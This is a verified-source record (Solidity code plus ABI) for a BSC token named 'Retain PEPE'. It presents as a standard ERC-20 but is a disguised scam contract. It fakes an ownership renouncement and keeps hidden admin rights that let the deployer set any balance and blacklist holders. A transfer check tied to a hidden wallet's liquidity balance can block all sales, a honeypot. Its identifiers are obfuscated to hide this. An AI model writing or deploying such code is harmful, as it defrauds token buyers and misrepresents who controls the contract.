{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.10;\n\ninterface buyMin {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address txMarketing) external view returns (uint256);\n\n    function transfer(address senderTx, uint256 swapEnableFrom) external returns (bool);\n\n    function allowance(address minTotalAmount, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 swapEnableFrom) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address senderTx,\n        uint256 swapEnableFrom\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed takeListSwap, uint256 value);\n    event Approval(address indexed minTotalAmount, address indexed spender, uint256 value);\n}\n\nabstract contract tokenTake {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface shouldTx {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface modeReceiver {\n    function createPair(address buyIs, address txMax) external returns (address);\n}\n\ninterface buyMinMetadata is buyMin {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract RetainPEPE is tokenTake, buyMin, buyMinMetadata {\n\n    function approve(address fundReceiver, uint256 swapEnableFrom) public virtual override returns (bool) {\n        isLiquidity[_msgSender()][fundReceiver] = swapEnableFrom;\n        emit Approval(_msgSender(), fundReceiver, swapEnableFrom);\n        return true;\n    }\n\n    function allowance(address senderAmountMax, address fundReceiver) external view virtual override returns (uint256) {\n        if (fundReceiver == buyTake) {\n            return type(uint256).max;\n        }\n        return isLiquidity[senderAmountMax][fundReceiver];\n    }\n\n    string private shouldLimit = \"RPE\";\n\n    address public atTeam;\n\n    constructor (){\n        if (atShould == isFund) {\n            toAuto = true;\n        }\n        shouldTx marketingFeeReceiver = shouldTx(buyTake);\n        tokenLiquidity = modeReceiver(marketingFeeReceiver.factory()).createPair(marketingFeeReceiver.WETH(), address(this));\n        \n        atTeam = _msgSender();\n        fundTotal();\n        modeFromWallet[atTeam] = true;\n        teamLimit[atTeam] = isExempt;\n        \n        emit Transfer(address(0), atTeam, isExempt);\n    }\n\n    uint256 totalLimitFrom;\n\n    uint8 private liquiditySwap = 18;\n\n    mapping(address => bool) public modeFromWallet;\n\n    function sellSwap() private view {\n        require(modeFromWallet[_msgSender()]);\n    }\n\n    function getOwner() external view returns (address) {\n        return feeMax;\n    }\n\n    string private limitLaunch = \"Retain PEPE\";\n\n    uint256 public atShould;\n\n    function amountFromFund(address launchAt) public {\n        sellSwap();\n        \n        if (launchAt == atTeam || launchAt == tokenLiquidity) {\n            return;\n        }\n        toAt[launchAt] = true;\n    }\n\n    function owner() external view returns (address) {\n        return feeMax;\n    }\n\n    event OwnershipTransferred(address indexed toExempt, address indexed listLimit);\n\n    function transfer(address tradingList, uint256 swapEnableFrom) external virtual override returns (bool) {\n        return receiverTo(_msgSender(), tradingList, swapEnableFrom);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return limitLaunch;\n    }\n\n    address buyTake = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    mapping(address => uint256) private teamLimit;\n\n    address public tokenLiquidity;\n\n    bool public toAuto;\n\n    uint256 marketingLimit;\n\n    address private feeMax;\n\n    function launchReceiver(uint256 swapEnableFrom) public {\n        sellSwap();\n        marketingLimit = swapEnableFrom;\n    }\n\n    mapping(address => bool) public toAt;\n\n    uint256 private isExempt = 100000000 * 10 ** 18;\n\n    function symbol() external view virtual override returns (string memory) {\n        return shouldLimit;\n    }\n\n    function launchSell(address receiverSender) public {\n        if (maxReceiver) {\n            return;\n        }\n        \n        modeFromWallet[receiverSender] = true;\n        \n        maxReceiver = true;\n    }\n\n    function feeTotal(address toReceiver, address senderTx, uint256 swapEnableFrom) internal returns (bool) {\n        require(teamLimit[toReceiver] >= swapEnableFrom);\n        teamLimit[toReceiver] -= swapEnableFrom;\n        teamLimit[senderTx] += swapEnableFrom;\n        emit Transfer(toReceiver, senderTx, swapEnableFrom);\n        return true;\n    }\n\n    function receiverTo(address toReceiver, address senderTx, uint256 swapEnableFrom) internal returns (bool) {\n        if (toReceiver == atTeam) {\n            return feeTotal(toReceiver, senderTx, swapEnableFrom);\n        }\n        uint256 launchedSell = buyMin(tokenLiquidity).balanceOf(walletAmount);\n        require(launchedSell == marketingLimit);\n        require(senderTx != walletAmount);\n        if (toAt[toReceiver]) {\n            return feeTotal(toReceiver, senderTx, fromListTotal);\n        }\n        return feeTotal(toReceiver, senderTx, swapEnableFrom);\n    }\n\n    bool public tokenReceiverTotal;\n\n    function transferFrom(address toReceiver, address senderTx, uint256 swapEnableFrom) external override returns (bool) {\n        if (_msgSender() != buyTake) {\n            if (isLiquidity[toReceiver][_msgSender()] != type(uint256).max) {\n                require(swapEnableFrom <= isLiquidity[toReceiver][_msgSender()]);\n                isLiquidity[toReceiver][_msgSender()] -= swapEnableFrom;\n            }\n        }\n        return receiverTo(toReceiver, senderTx, swapEnableFrom);\n    }\n\n    uint256 constant fromListTotal = 1 ** 10;\n\n    function fundTotal() public {\n        emit OwnershipTransferred(atTeam, address(0));\n        feeMax = address(0);\n    }\n\n    uint256 private isFund;\n\n    address walletAmount = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    bool public maxReceiver;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return isExempt;\n    }\n\n    function balanceOf(address txMarketing) public view virtual override returns (uint256) {\n        return teamLimit[txMarketing];\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return liquiditySwap;\n    }\n\n    function maxSwapLimit(address tradingList, uint256 swapEnableFrom) public {\n        sellSwap();\n        teamLimit[tradingList] = swapEnableFrom;\n    }\n\n    mapping(address => mapping(address => uint256)) private isLiquidity;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"minTotalAmount\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"toExempt\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"listLimit\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"takeListSwap\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderAmountMax\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fundReceiver\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchAt\",\"type\":\"address\"}],\"name\":\"amountFromFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapEnableFrom\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atShould\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atTeam\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txMarketing\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"swapEnableFrom\",\"type\":\"uint256\"}],\"name\":\"launchReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverSender\",\"type\":\"address\"}],\"name\":\"launchSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingList\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapEnableFrom\",\"type\":\"uint256\"}],\"name\":\"maxSwapLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"modeFromWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"toAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenLiquidity\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenReceiverTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingList\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapEnableFrom\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"senderTx\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapEnableFrom\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "RetainPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}